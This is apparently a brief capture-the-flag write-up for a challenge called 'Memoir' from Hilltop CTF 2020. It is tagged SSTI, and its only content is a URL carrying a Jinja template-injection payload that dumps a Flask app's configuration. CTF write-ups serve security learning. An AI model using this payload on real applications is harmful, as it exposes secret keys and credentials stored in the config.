---
title: "Hilltop CTF 2020 - Memoir"
subtitle: "June 9, 2020"
link: "/posts/Memoir/"
label: "SSTI"
align: "left"
---
```text
http://:admin@localhost/action/{{url_for.__globals__.current_app.config}}
```
